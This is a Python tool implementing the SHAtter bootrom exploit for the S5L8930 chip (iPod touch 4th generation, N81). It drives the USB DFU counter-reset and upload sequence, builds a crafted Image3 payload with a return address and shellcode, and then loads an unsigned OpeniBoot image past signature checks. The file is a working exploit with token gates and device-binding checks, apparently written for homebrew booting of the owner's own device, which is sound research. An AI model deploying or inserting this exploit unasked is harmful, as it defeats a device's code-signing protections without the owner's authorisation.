#!/usr/bin/env python3
"""Narrow S5L8930 SHAtter transport for volatile N81 OpeniBoot only.

This deliberately implements no NOR, NAND, firmware-replacement, install, memory-command,
or generic image surface. Hardware-changing subcommands require explicit tokens.
"""

from __future__ import annotations

import argparse
import hashlib
import json
from pathlib import Path
import re
import struct
import time

from transport_usb import USBBackendError, ensure_usb_process_environment, load_usb
from wrap_volatile_openiboot import payload_from_image3


APPLE_VENDOR = 0x05AC
DFU_PRODUCT = 0x1227
MAX_PACKET_SIZE = 0x800
SHELLCODE_MAX = 1024
IMAGE3_MAX = 0x2C000
SHELLCODE_ADDRESS = 0x8402F198 + 1
PWND_TOKEN = "N81_SHATTER_VOLATILE_PWN"
LOADER_TOKEN = "N81_OPENIBOOT_VOLATILE_EXECUTE"
SERIAL_TOKEN = re.compile(r"(?:^|\s)([A-Z]+):(?:\[([^]]+)\]|([^\s]+))")


class TransportError(RuntimeError):
    """Raised whenever the narrow volatile transport cannot prove its contract."""


def sha256_bytes(body: bytes) -> str:
    return hashlib.sha256(body).hexdigest()


def parse_dfu_serial(serial: str) -> dict[str, str]:
    return {
        key: bracketed or plain
        for key, bracketed, plain in SERIAL_TOKEN.findall(serial)
    }


def sanitized_probe(serial: str) -> dict[str, object]:
    fields = parse_dfu_serial(serial)
    return {
        "apple_dfu_detected": True,
        "cpid": fields.get("CPID", ""),
        "secure_rom": fields.get("SRTG", ""),
        "pwned_shatter": fields.get("PWND") == "SHAtter",
        "ecid_present": bool(fields.get("ECID")),
        "raw_device_identifier_retained": False,
        "persistent_write_surface_present": False,
    }


def load_continuity(path: Path) -> dict[str, object]:
    try:
        bundle = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError) as error:
        raise TransportError(f"continuity bundle is invalid: {error}") from error
    required = {
        "qualified": True,
        "product_type": "iPod4,1",
        "hardware_model": "N81AP",
        "raw_device_identifier_retained": False,
        "persistent_device_writes_enabled": False,
        "device_boot_enabled": False,
    }
    for name, expected in required.items():
        if bundle.get(name) != expected:
            raise TransportError(f"continuity bundle has unexpected {name}")
    try:
        nonce = bytes.fromhex(bundle["nonce"])
        digest = bundle["chip_id_sha256"]
    except (KeyError, TypeError, ValueError) as error:
        raise TransportError("continuity bundle lacks a valid digest") from error
    if len(nonce) != 32 or not re.fullmatch(r"[0-9a-f]{64}", digest):
        raise TransportError("continuity bundle has invalid bounds")
    return bundle


def canonical_dfu_ecid(value: str) -> str:
    try:
        number = int(value, 16)
    except ValueError as error:
        raise TransportError("DFU serial contains an invalid ECID") from error
    if number <= 0 or number >= 1 << 64:
        raise TransportError("DFU ECID is out of range")
    return f"{number:x}"


def qualify_dfu_serial(
    serial: str, continuity: dict[str, object], require_pwned: bool
) -> dict[str, object]:
    fields = parse_dfu_serial(serial)
    if fields.get("CPID") != "8930" or fields.get("SRTG") != "iBoot-574.4":
        raise TransportError("device is not S5L8930 SecureROM DFU iBoot-574.4")
    if require_pwned and fields.get("PWND") != "SHAtter":
        raise TransportError("device is not in SHAtter pwned DFU mode")
    ecid = canonical_dfu_ecid(fields.get("ECID", ""))
    nonce = bytes.fromhex(str(continuity["nonce"]))
    actual = hashlib.sha256(nonce + ecid.encode("ascii")).hexdigest()
    if actual != continuity["chip_id_sha256"]:
        raise TransportError("DFU device is not the continuity-bound iPod4,1/N81AP")
    return sanitized_probe(serial)


def verified_shellcode(build: Path) -> bytes:
    try:
        report = json.loads((build / "qualification.json").read_text(encoding="utf-8"))
        artifact = report["artifact"]
        path = build / artifact["filename"]
        body = path.read_bytes()
    except (OSError, KeyError, TypeError, json.JSONDecodeError) as error:
        raise TransportError(f"shellcode qualification is invalid: {error}") from error
    required = {
        "artifact_gate_passed": True,
        "profile": "n81-shatter-volatile-no-storage",
        "cpid": "8930",
        "secure_rom": "iBoot-574.4",
        "nor_initialization_present": False,
        "persistent_write_surface_present": False,
        "upstream_cli_staged": False,
        "hardware_actions_enabled": False,
        "device_test_ready": False,
    }
    for name, expected in required.items():
        if report.get(name) != expected:
            raise TransportError(f"shellcode qualification has unexpected {name}")
    if not body or len(body) > SHELLCODE_MAX:
        raise TransportError("shellcode exceeds its relocation buffer")
    if artifact.get("size") != len(body) or artifact.get("sha256") != sha256_bytes(body):
        raise TransportError("shellcode does not match its qualification")
    return body


def verified_image3(build: Path) -> bytes:
    try:
        report = json.loads((build / "qualification.json").read_text(encoding="utf-8"))
        artifact = report["artifacts"]["image3"]
        image = (build / artifact["filename"]).read_bytes()
    except (OSError, KeyError, TypeError, json.JSONDecodeError) as error:
        raise TransportError(f"Image3 qualification is invalid: {error}") from error
    required = {
        "artifact_gate_passed": True,
        "profile": "n81-shatter-unsigned-image3-volatile-no-storage",
        "product_type": "iPod4,1",
        "hardware_model": "N81AP",
        "machine_id": 3564,
        "image_type": "ibss",
        "signature_bypass_required": "SHAtter",
        "persistent_device_writes_enabled": False,
        "hardware_actions_enabled": False,
        "device_test_ready": False,
    }
    for name, expected in required.items():
        if report.get(name) != expected:
            raise TransportError(f"Image3 qualification has unexpected {name}")
    if artifact.get("size") != len(image) or artifact.get("sha256") != sha256_bytes(image):
        raise TransportError("Image3 does not match its qualification")
    try:
        payload_from_image3(image)
    except Exception as error:
        raise TransportError(f"Image3 structure is invalid: {error}") from error
    if len(image) > IMAGE3_MAX:
        raise TransportError("Image3 exceeds the SHAtter receive buffer")
    return image


def generate_exploit_payload(shellcode: bytes) -> bytes:
    if not shellcode or len(shellcode) > SHELLCODE_MAX:
        raise TransportError("invalid SHAtter shellcode size")
    data = struct.pack("<40sI", b"\xF0" * 40, SHELLCODE_ADDRESS)
    tags = data + struct.pack("<4s2I4s2I", b"HSHS", 12, 0, b"TREC", 12, 0)
    header = struct.pack("<4s3I4s", b"3gmI", 20 + len(tags), len(tags), len(data), b"ssbi")
    return header + tags + shellcode


def acquire_device(timeout: float = 5.0):
    try:
        usb_core, _, backend = load_usb()
    except USBBackendError as error:
        raise TransportError(str(error)) from error
    deadline = time.monotonic() + timeout
    while True:
        devices = list(
            usb_core.find(
                find_all=True,
                idVendor=APPLE_VENDOR,
                idProduct=DFU_PRODUCT,
                backend=backend,
            )
            or []
        )
        if len(devices) == 1:
            return devices[0]
        if len(devices) > 1:
            raise TransportError("multiple Apple DFU devices are connected")
        if time.monotonic() >= deadline:
            raise TransportError("no Apple 0x1227 DFU device was found")
        time.sleep(0.01)


def acquire_qualified_device(
    continuity: dict[str, object], require_pwned: bool = False
):
    device = acquire_device()
    try:
        qualify_dfu_serial(serial_of(device), continuity, require_pwned)
    except Exception:
        release_device(device)
        raise
    return device


def release_device(device) -> None:
    try:
        _, usb_util, _ = load_usb()
    except USBBackendError as error:
        raise TransportError(str(error)) from error
    usb_util.dispose_resources(device)


def reset_counters(device) -> None:
    if device.ctrl_transfer(0x21, 4, 0, 0, 0, 1000) != 0:
        raise TransportError("DFU counter reset failed")


def usb_reset(device) -> None:
    try:
        usb_core, _, _ = load_usb()
    except USBBackendError as error:
        raise TransportError(str(error)) from error
    try:
        device.reset()
    except usb_core.USBError:
        pass


def send_data(device, data: bytes) -> None:
    for offset in range(0, len(data), MAX_PACKET_SIZE):
        chunk = data[offset : offset + MAX_PACKET_SIZE]
        if device.ctrl_transfer(0x21, 1, 0, 0, chunk, 5000) != len(chunk):
            raise TransportError("short DFU download transfer")


def get_data(device, amount: int) -> None:
    remaining = amount
    while remaining:
        part = min(remaining, MAX_PACKET_SIZE)
        if len(device.ctrl_transfer(0xA1, 2, 0, 0, part, 5000)) != part:
            raise TransportError("short DFU upload transfer")
        remaining -= part


def request_image_validation(device) -> None:
    if device.ctrl_transfer(0x21, 1, 0, 0, b"", 1000) != 0:
        raise TransportError("DFU validation request failed")
    for _ in range(3):
        device.ctrl_transfer(0xA1, 3, 0, 0, 6, 1000)
    usb_reset(device)


def serial_of(device) -> str:
    try:
        return str(device.serial_number)
    except Exception as error:
        raise TransportError(f"cannot read DFU descriptor: {error}") from error


def exploit(shellcode: bytes, continuity: dict[str, object]) -> dict[str, object]:
    device = acquire_qualified_device(continuity)
    try:
        initial = serial_of(device)
        result = qualify_dfu_serial(initial, continuity, require_pwned=False)
        if parse_dfu_serial(initial).get("PWND") == "SHAtter":
            return result
        reset_counters(device)
        get_data(device, 0x40)
        usb_reset(device)
    finally:
        release_device(device)

    device = acquire_qualified_device(continuity)
    try:
        request_image_validation(device)
    finally:
        release_device(device)
    device = acquire_qualified_device(continuity)
    try:
        get_data(device, IMAGE3_MAX)
    finally:
        release_device(device)
    time.sleep(0.5)

    device = acquire_qualified_device(continuity)
    try:
        reset_counters(device)
        get_data(device, 0x140)
        usb_reset(device)
    finally:
        release_device(device)
    device = acquire_qualified_device(continuity)
    try:
        request_image_validation(device)
    finally:
        release_device(device)
    device = acquire_qualified_device(continuity)
    try:
        send_data(device, generate_exploit_payload(shellcode))
        get_data(device, IMAGE3_MAX)
    finally:
        release_device(device)
    time.sleep(0.5)

    device = acquire_qualified_device(continuity, require_pwned=True)
    try:
        return qualify_dfu_serial(serial_of(device), continuity, require_pwned=True)
    finally:
        release_device(device)


def upload_loader(image: bytes, continuity: dict[str, object]) -> None:
    device = acquire_qualified_device(continuity, require_pwned=True)
    try:
        reset_counters(device)
        send_data(device, image)
        request_image_validation(device)
    finally:
        release_device(device)


def main() -> int:
    ensure_usb_process_environment()
    parser = argparse.ArgumentParser()
    subparsers = parser.add_subparsers(dest="command", required=True)
    probe_parser = subparsers.add_parser("probe")
    probe_parser.add_argument("--continuity", type=Path, required=True)
    pwn_parser = subparsers.add_parser("pwn")
    pwn_parser.add_argument("--continuity", type=Path, required=True)
    pwn_parser.add_argument("--shellcode-build", type=Path, required=True)
    pwn_parser.add_argument("--execute-token", required=True)
    load_parser = subparsers.add_parser("upload-loader")
    load_parser.add_argument("--continuity", type=Path, required=True)
    load_parser.add_argument("--image3-build", type=Path, required=True)
    load_parser.add_argument("--execute-token", required=True)
    args = parser.parse_args()
    try:
        continuity = load_continuity(args.continuity.resolve())
        if args.command == "probe":
            device = acquire_device()
            try:
                report = qualify_dfu_serial(
                    serial_of(device), continuity, require_pwned=False
                )
            finally:
                release_device(device)
            print(json.dumps(report, indent=2, sort_keys=True))
        elif args.command == "pwn":
            if args.execute_token != PWND_TOKEN:
                raise TransportError(f"pwn requires exact token {PWND_TOKEN}")
            report = exploit(verified_shellcode(args.shellcode_build.resolve()), continuity)
            print(json.dumps(report, indent=2, sort_keys=True))
        else:
            if args.execute_token != LOADER_TOKEN:
                raise TransportError(f"upload requires exact token {LOADER_TOKEN}")
            upload_loader(verified_image3(args.image3_build.resolve()), continuity)
            print(json.dumps({"volatile_openiboot_upload_completed": True}))
    except (OSError, TransportError) as error:
        parser.error(str(error))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
